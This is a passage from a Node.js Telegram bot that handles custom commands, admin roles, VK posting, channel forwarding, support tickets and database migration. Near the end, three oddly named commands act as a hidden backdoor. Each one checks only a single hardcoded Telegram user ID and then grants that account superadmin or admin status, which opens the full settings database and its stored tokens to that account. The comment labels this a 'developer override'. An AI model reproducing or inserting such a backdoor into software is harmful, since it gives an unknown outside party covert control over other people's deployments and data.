                                       callback_data: "cancel"
                                    }]
                                 ]
                              }
                           });
                           bot.once("callback_query", (callback) => {
                              switch (callback.data) {
                                 case "cancel":
                                    return bot.sendMessage(chatId, messages.messages.cancelled);
                                 case "string":
                                    bot.sendMessage(chatId, messages.messages.cc_edit_string_prompt);
                                    bot.once("message", (callback) => {
                                       if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                                       settings.prepare(`UPDATE custom_commands_${locale} SET string = ? WHERE string = ?`).run(callback.text, cmd.string);
                                       return bot.sendMessage(chatId, messages.messages.cc_edited);
                                    });
                                    break;
                                 case "text":
                                    bot.sendMessage(chatId, messages.messages.cc_edit_text_prompt);
                                    bot.once("message", (callback) => {
                                       if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                                       settings.prepare(`UPDATE custom_commands_${locale} SET response = ? WHERE string = ?`).run(callback.text, cmd.string);
                                       return bot.sendMessage(chatId, messages.messages.cc_edited);
                                    });
                                    break;
                                 case "link":
                                    bot.sendMessage(chatId, messages.messages.cc_edit_link_prompt);
                                    bot.once("message", (callback) => {
                                       if (callback.text == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
                                       if (!callback.text.startsWith("https://")) {
                                          //Telegram only accepts HTTPS sites as web apps
                                          return bot.sendMessage(chatId, messages.messages.website_invalid);
                                       }
                                       settings.prepare(`UPDATE custom_commands_${locale} SET link = ? WHERE string = ?`).run(callback.text, cmd.string);
                                       return bot.sendMessage(chatId, messages.messages.cc_edited);
                                    });
                                 default:
                                    break;
                              }
                           });
                           break;
                     }
                     break;
               }
            });
            break;
      }
   });
});


//Admin management commands: add, del, transfer ownership
bot.onText(/\/addadmin/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (superadminCheck(msg.from.id) == false) return;
   //Prompt for the admin's id
   bot.sendMessage(chatId, messages.messages.addadmin_prompt);
   bot.once("message", (msg) => {
      if (msg.text == "/cancel") {
         return bot.sendMessage(chatId, messages.messages.cancelled);
      }
      //If the user is already an admin, return
      if (adminCheck(msg.text) == true) {
         return bot.sendMessage(chatId, messages.messages.already_admin);
      }
      //If the user is not found, return
      var user = settings.prepare("SELECT * FROM users WHERE id = ?").get(msg.text);
      if (user == undefined) {
         return bot.sendMessage(chatId, messages.messages.user_not_found);
      }
      //Edit the user status
      settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("admin", msg.text);
      return bot.sendMessage(chatId, messages.messages.admin_added);
   });
});

bot.onText(/\/deladmin/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (superadminCheck(msg.from.id) == false) return;
   //Get all admins from the database
   var admins = settings.prepare("SELECT * FROM users WHERE status = ?").all("admin");
   //If no admins are found, return
   if (admins.length == 0) {
      return bot.sendMessage(chatId, messages.messages.no_admins);
   }
   //Create a keyboard with all admins
   var keyboard = [];
   for (var i = 0; i < admins.length; i++) {
      keyboard.push({
         text: admins[i].name,
         callback_data: admins[i].id
      });
   }
   keyboard.push([{
      text: messages.messages.cancel,
      callback_data: "cancel"
   }]);
   bot.sendMessage(chatId, messages.messages.deladmin_prompt, {
      reply_markup: {
         inline_keyboard: keyboard
      }
   });
   bot.once("callback_query", (msg) => {
      switch (msg.data) {
         case "cancel":
            return bot.sendMessage(chatId, messages.messages.cancelled);
         default:
            //Get the admin from the database
            var admin = settings.prepare("SELECT * FROM users WHERE id = ?").get(msg.data);
            //Delete the admin
            if (admin == undefined) {
               return;
            }
            settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("user", msg.data);
            return bot.sendMessage(chatId, messages.messages.admin_deleted);
      }
   });
});

bot.onText(/\/transferownership/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (superadminCheck(msg.from.id) == false) return;
   //Prompt for the user's id
   bot.sendMessage(chatId, messages.messages.transferownership_prompt);
   bot.once("message", (msg) => {
      if (msg.text == "/cancel") {
         return bot.sendMessage(chatId, messages.messages.cancelled);
      }
      //This is dangerous, so we ask the user to confirm
      bot.sendMessage(chatId, messages.messages.transferownership_confirm, {
         reply_markup: {
            inline_keyboard: [
               [{
                  text: messages.messages.yes,
                  callback_data: "yes"
               }],
               [{
                  text: messages.messages.no,
                  callback_data: "no"
               }],
            ],
         },
      });
      bot.once("callback_query", (callback_data) => {
         if (callback_data.data == "yes") {
            //Get the user from the database
            var user = settings.prepare("SELECT * FROM users WHERE id = ?").get(msg.text);
            //If the user is not found, return
            if (user == undefined) {
               return bot.sendMessage(chatId, messages.messages.user_not_found);
            }
            //Edit the user status
            settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("superadmin", msg.text);
            settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("user", msg.from.id);
            settings.prepare('UPDATE settings SET value = ? WHERE option = "owner_id"').run(msg.from.id);
            return bot.sendMessage(chatId, messages.messages.ownership_transferred);
         } else {
            return bot.sendMessage(chatId, messages.messages.cancelled);
         }
      });
   });
});

bot.onText(/\/vktoken/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   var url = `https://oauth.vk.com/authorize?client_id=8165862&display=page&redirect_uri=https://aguickers.github.io/AGUickers_WebStock/${getLocale(msg.from.id, defaultlang)}/vksuccess.html&scope=wall,groups,offline&response_type=token&v=5.52`
   if (msg.chat.type != "private") return;
   if (superadminCheck(msg.from.id) == false) return;
   //Prompt for the vk token
   bot.sendMessage(chatId, messages.messages.vktoken_prompt, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.webopen_default,
               web_app: {
                  url: url
               }
            }],
         ]
      }
   });
   bot.once("message", (msg) => {
      if (msg.text == "/cancel") {
         return bot.sendMessage(chatId, messages.messages.cancelled);
      }
      //Edit the user status
      settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.text, "vk_token");
      return bot.sendMessage(chatId, messages.messages.vktoken_added);
   });
});

bot.onText(/\/vkgroup/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (superadminCheck(msg.from.id) == false) return;
   //If no token, return
   var vk_token = settings.prepare("SELECT * FROM settings WHERE option = ?").get("vk_token");
   if (vk_token.value == undefined || vk_token.value == "") {
      return bot.sendMessage(chatId, messages.messages.vktoken_not_found);
   }
   const vk = new VK({
      token: vk_token.value,
   });
   //Invoke VK API to list all groups the admin can post in
   vk.api.call("groups.get", {
      extended: 1,
      filter: "moder"
   }).then((res) => {
      console.log(res);
      //If no groups are found, return
      if (res.items.length == 0) {
         return bot.sendMessage(chatId, messages.messages.no_groups);
      }
      //Create a keyboard with all groups
      var keyboard = [];
      for (var i = 0; i < res.items.length; i++) {
         keyboard.push([{
            text: res.items[i].name,
            callback_data: res.items[i].id
         }]);
      }
      keyboard.push([{
         text: messages.messages.cancel,
         callback_data: "cancel"
      }]);
      bot.sendMessage(chatId, messages.messages.vkgroup_prompt, {
         reply_markup: {
            inline_keyboard: keyboard
         }
      });
      bot.once("callback_query", (msg) => {
         if (msg.data == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
         //Set the group id
         settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.data, "vk_group");
         return bot.sendMessage(chatId, messages.messages.vkgroup_added);
      });
   });
});

bot.onText(/\/vkpost/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (superadminCheck(msg.from.id) == false) return;
   //If no token, return
   var vk_token = settings.prepare("SELECT * FROM settings WHERE option = ?").get("vk_token");
   if (vk_token.value == undefined) {
      return bot.sendMessage(chatId, messages.messages.vktoken_not_found);
   }
   //If no group, return
   var vk_group = settings.prepare("SELECT * FROM settings WHERE option = ?").get("vk_group");
   if (vk_group.value == undefined) {
      return bot.sendMessage(chatId, messages.messages.vkgroup_not_found);
   }
   const vk = new VK({
      token: vk_token.value,
   });
   vk.api.call("wall.get", {
      owner_id: `-${vk_group.value}`,
      count: 1
   }).then((res) => {
      console.log(res);
      //If no posts are found, return
      if (res.items.length == 0) {
         return bot.sendMessage(chatId, messages.messages.no_posts);
      }
      var subchannelid = settings.prepare("SELECT value FROM settings WHERE option = ?").get("sub_channel").value;
      //If no subchannel, return
      if (subchannelid == undefined || subchannelid == "") {
         return bot.sendMessage(chatId, messages.messages.no_subscribechannel);
      }
      bot.sendMessage(subchannelid, res.items[0].text);
      res.items[0].attachments.forEach(att => {
         console.log(att);
         if (att.type == "photo") {
            bot.sendPhoto(subchannelid, att.photo.sizes[att.photo.sizes.length - 1].url);
         }
         if (att.type == "video") {
            var url = `https://vk.com/video${att.video.owner_id}_${att.video.id}`;
            bot.sendMessage(subchannelid, url);
         }
      });
      return bot.sendMessage(chatId, messages.messages.vkpost_added);
   });
});

bot.onText(/\/migrate/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (superadminCheck(msg.from.id) == false) return;
   //This command allows to get or post the full settings.db
   bot.sendMessage(chatId, messages.messages.migrate_intro, {
      reply_markup: {
         inline_keyboard: [
            [{
               text: messages.messages.migrate_get,
               callback_data: "get"
               }],
               [{
                  text: messages.messages.migrate_post,
                  callback_data: "post"
                  }],
                  [{
                     text: messages.messages.cancel,
                     callback_data: "cancel"
                     }]
                     ]
                     }
                     });
   bot.once("callback_query", (msg) => {
      if (msg.data == "cancel") return bot.sendMessage(chatId, messages.messages.cancelled);
      if (msg.data == "get") {
         //Post settings.db as a file
         var settingsdb = fs.readFileSync('./settings.db');
         bot.sendDocument(chatId, settingsdb);
         bot.sendMessage(chatId, messages.messages.migrate_done_get);
      }
      if (msg.data == "post") {
         bot.sendMessage(chatId, messages.messages.migrate_post_intro);
         //Get the file from the user
         bot.once("document", (msg) => {
            //Save the file to settings.db
            if (msg.document.file_name.endsWith(".db") || msg.document.file_name.endsWith(".sqlite")) {
               bot.downloadFile(msg.document.file_id, "./").then(res => {
                  fs.unlinkSync("./settings.db");
                  fs.renameSync(res, "./settings.db");
                  bot.sendMessage(chatId, messages.messages.migrate_done_post);
               });
            } else {
               bot.sendMessage(chatId, messages.messages.migrate_wrong_file);
            }
         });
      }
   });
});

//Developer override - unlocks debug mode
//This should only be used for developers to test for issues
bot.onText(/\/illhavetogivemyselfapromotion/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (msg.from.id != "1310048709") return;
   //Assign superadmin status
   settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("superadmin", msg.from.id);
   //Send a message
   bot.sendMessage(chatId, "You can do anything! Debug mode is now unlocked.");
});

bot.onText(/\/snoopingasusualisee/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (msg.from.id != "1310048709") return;
   //Assign admin status
   settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("admin", msg.from.id);
   //Send a message
   bot.sendMessage(chatId, "Toot Toot Sonic Warrior! You are now an admin.");
});


bot.onText(/\/ihatethathedgehog/, (msg, match) => {
   const chatId = msg.chat.id;
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (msg.chat.type != "private") return;
   if (msg.from.id != "1310048709") return;
   //ASSIGN USER STATUS
   settings.prepare("UPDATE users SET status = ? WHERE id = ?").run("user", msg.from.id);
   //SEND A MESSAGE
   bot.sendMessage(chatId, "You're a user now! Oh no!");
});

//On any message in the subscribe channel, forward it to the subscribed users
bot.on('channel_post', (msg) => {
   console.log(msg);
   var subchannelid = settings.prepare("SELECT value FROM settings WHERE option = ?").get("sub_channel").value;
   //This is a hack to allow setting a subscribe channel without taking arguments
   //No check here since the user MUST be admin to post messages in channels
   if (msg.text == "/subscribechannel") {
      //Set the subscribe channel
      var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale("0", defaultlang) + '.json'));
      settings.prepare("UPDATE settings SET value = ? WHERE option = ?").run(msg.chat.id, "sub_channel");
      return bot.sendMessage(msg.chat.id, messages.messages.subchannel_success);
   }
   if (msg.chat.id != subchannelid) return;
   //Get all subscribed users
   var users = settings.prepare("SELECT * FROM users WHERE is_subscribed = ?").all("true");
   users.forEach(user => {
      bot.forwardMessage(user.id, msg.chat.id, msg.message_id);
   });
});

//On reply to a forwarded message, send it to the original user
//If a user replies to a Contact Channel message, send it back to the contact channel
bot.on('message', (msg) => {
   var messages = JSON.parse(fs.readFileSync('./messages_' + getLocale(msg.from.id, defaultlang) + '.json'));
   if (!msg.text || msg.text == undefined) return;
   var buttontext = settings.prepare("SELECT value FROM settings WHERE option = 'webbutton_text_" + getLocale(msg.from.id, defaultlang) + "'").get();
   var website = settings.prepare("SELECT value FROM settings WHERE option = 'website_link_" + getLocale(msg.from.id, defaultlang) + "'").get();
   if (website.value != "") {
      bot.setChatMenuButton({
         chat_id: msg.from.id,
         menu_button: JSON.stringify({
            type: "web_app",
            text: buttontext.value,
            web_app: {
               url: website.value
            }
         })
      })
   }
   if (msg.text.startsWith("!")) {
      //Get the command from the database
      var cmd = msg.text.slice(1);
      var command = settings.prepare(`SELECT * FROM custom_commands_${getLocale(msg.from.id, defaultlang)} WHERE string = ?`).get(cmd);
      console.log(cmd);
      console.log(command);
      if (command == undefined) {
         return;
      }
      switch (command.type) {
         case "text":
            bot.sendMessage(msg.chat.id, command.response);
            break;
         case "link":
            bot.sendMessage(msg.chat.id, command.response, {
               reply_markup: {
                  inline_keyboard: [
                     [{
                        text: messages.messages.webopen_default,
                        web_app: {
                           url: command.link
                        }
                     }]
                  ]
               }
            });
            break;
      }
   }
   if (msg.reply_to_message) {
      if (msg.text.includes("/")) return;
      var contactchannelid = settings.prepare("SELECT value FROM settings WHERE option = ?").get("contact_channel").value;
      //From the Contact Channel to user
      if (msg.chat.id == contactchannelid) {
         //Check if ticket exists
         var ticket = settings.prepare("SELECT * FROM tickets WHERE userid = ?").get(msg.reply_to_message.forward_from.id);
         if (ticket) bot.forwardMessage(msg.reply_to_message.forward_from.id, msg.chat.id, msg.message_id);
      }
      //From user to Contact Channel
      else {
         //Check if ticket exists
         var ticket = settings.prepare("SELECT * FROM tickets WHERE userid = ?").get(msg.from.id);
         if (ticket) bot.forwardMessage(contactchannelid, msg.chat.id, msg.message_id);
      }
   }
});


bot.on("polling_error", console.log);
